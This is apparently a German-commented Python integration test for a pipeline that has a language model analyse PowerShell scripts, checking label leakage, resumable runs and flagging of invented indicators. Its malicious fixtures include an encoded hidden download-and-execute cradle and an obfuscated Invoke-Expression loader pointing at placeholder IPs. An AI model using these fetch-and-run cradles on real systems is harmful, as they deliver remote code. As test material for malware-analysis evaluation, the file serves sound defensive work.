#!/usr/bin/env python3
"""
Durchlauf der ganzen Pipeline gegen das Test-Modell: Fallliste -> Abfragen ->
Auswertung. Prüft vor allem, dass Label, Dateiname und Hash nie im Material
landen und dass ein abgebrochener Lauf fortgesetzt wird.

Aufruf:  python3 tests/test_pipeline.py
"""
import base64
import csv
import json
import subprocess
import sys
import tempfile
import threading
from pathlib import Path

WURZEL = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(WURZEL / "src"))
sys.path.insert(0, str(WURZEL / "tests"))
import mock_server  # noqa: E402
import query  # noqa: E402
import steckbrief as S  # noqa: E402


def lauf(*args):
    r = subprocess.run([sys.executable] + [str(a) for a in args], capture_output=True, text=True)
    assert r.returncode == 0, r.stdout + r.stderr
    return r.stdout


def main():
    srv = mock_server.starte(0)
    port = srv.server_address[1]
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    with tempfile.TemporaryDirectory() as tmp:
        t = Path(tmp)
        (t / "gut").mkdir(); (t / "boese").mkdir()
        (t / "gut" / "hallo_geheimname.ps1").write_text("param($n)\nWrite-Host \"Hallo $n\"\nGet-ChildItem C:\\Temp\n")
        (t / "gut" / "firewall_geheimname.ps1").write_text("# Doku: https://example.org/hilfe\nNew-NetFirewallRule -DisplayName Web -Action Allow -LocalPort 443\n")
        inner = "IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.5/a.ps1')"
        (t / "boese" / "lader_geheimname.ps1").write_text("powershell -nop -w hidden -enc " + base64.b64encode(inner.encode("utf-16-le")).decode() + "\n")
        (t / "boese" / "klartext_geheimname.ps1").write_text("$u='htt'+'p://192.0.2.9/x'\nInvoke-Expression (Invoke-WebRequest $u).Content\n")
        (t / "boese" / "doppelt.ps1").write_text("$u='htt'+'p://192.0.2.9/x'\nInvoke-Expression (Invoke-WebRequest $u).Content\n")

        print(lauf(WURZEL / "src/query.py", "faelle", "--ordner", "%s=benign" % (t / "gut"), "%s=malicious" % (t / "boese"), "--out", t / "faelle.csv").strip())
        faelle = list(csv.DictReader(open(t / "faelle.csv", encoding="utf-8")))
        assert len(faelle) == 4, "identische Datei muss nur einmal vorkommen"

        befehl = [WURZEL / "src/query.py", "lauf", "--faelle", t / "faelle.csv", "--basis-url", "http://127.0.0.1:%d/v1" % port,
                  "--modell", "mock-modell", "--lauf", t / "lauf", "--wiederholungen", "2", "--versuche", "3"]
        lauf(*befehl)
        dateien = sorted((t / "lauf" / "antworten").glob("*.json"))
        assert len(dateien) == 4 * 3 * 2, len(dateien)
        assert "0 neue Antworten" in lauf(*befehl), "zweiter Start darf nichts neu senden"

        for p in dateien:
            a = json.loads(p.read_text(encoding="utf-8"))
            fall = next(f for f in faelle if f["id"] == a["fall"])
            mat = a["material"]
            assert "geheimname" not in mat and fall["sha256"] not in mat, "Dateiname oder Hash im Material: " + p.name
            assert "malicious" not in mat and "benign" not in mat and "ground_truth" not in mat, "Label im Material: " + p.name
            assert (query.KOPF_CODE in mat) == (a["variante"] in "AC") and (query.KOPF_SB in mat) == (a["variante"] in "BC")
            assert a["status"] in ("ok", "ungueltig")
        assert any(json.loads(p.read_text())["status"] == "ungueltig" for p in dateien), "Antwort ohne JSON muss als ungültig zählen"

        # Die URL aus dem kodierten Befehl steht nur mit Steckbrief im Material
        lader = next(f["id"] for f in faelle if "lader" in f["pfad"])
        mat = {json.loads(p.read_text())["variante"]: json.loads(p.read_text())["material"] for p in dateien if p.name.startswith(lader)}
        assert "http://192.0.2.5/a.ps1" not in mat["A"] and "http://192.0.2.5/a.ps1" in mat["B"] and "http://192.0.2.5/a.ps1" in mat["C"]

        aus = lauf(WURZEL / "src/evaluate.py", "--faelle", t / "faelle.csv", "--lauf", t / "lauf", "--annotationen", t / "keine")
        for name in ("zusammenfassung.md", "metriken.csv", "aussagen.csv", "iocs.csv"):
            assert (t / "lauf" / "auswertung" / name).exists(), name
        assert "Test-Modell" in aus
        zeilen = list(csv.DictReader(open(t / "lauf" / "auswertung" / "metriken.csv", encoding="utf-8")))
        assert [z["eingabe"] for z in zeilen] == ["A", "B", "C", "-"]
        iocs = list(csv.DictReader(open(t / "lauf" / "auswertung" / "iocs.csv", encoding="utf-8")))
        assert any(z["klasse"] == "unbestaetigt" and "erfunden" in z["wert"] for z in iocs), "erfundener IOC muss auffallen"
        auss = list(csv.DictReader(open(t / "lauf" / "auswertung" / "aussagen.csv", encoding="utf-8")))
        assert any(z["beleg_im_material"] == "nein" for z in auss) and any(z["beleg_im_material"] == "ja" for z in auss)

        # Handbewertung einlesen
        for i, z in enumerate(auss):
            z["bewertung"] = ("belegt", "unbelegt", "richtig_unbelegt", "falsch")[i % 4]
        with open(t / "bewertet.csv", "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=list(auss[0].keys())); w.writeheader(); w.writerows(auss)
        assert "richtig, aber unbelegt" in lauf(WURZEL / "src/evaluate.py", "--faelle", t / "faelle.csv", "--lauf", t / "lauf", "--bewertung", t / "bewertet.csv")

    # Prompt in der Oberfläche und in der Datei müssen gleich sein
    import re
    html = (WURZEL / "tool/steckbrief-werkbank.html").read_text(encoding="utf-8")
    im_tool = json.loads(re.search(r'/\*PROMPT-START\*/(".*?")/\*PROMPT-END\*/', html, re.S).group(1))
    assert im_tool == (WURZEL / "prompts/analyse_prompt.txt").read_text(encoding="utf-8"), "Prompt weicht ab"
    assert ('const VERSION = "%s"' % S.VERSION) in html, "Versionsnummer weicht ab"
    srv.shutdown()
    print("Pipeline-Test bestanden")


if __name__ == "__main__":
    main()
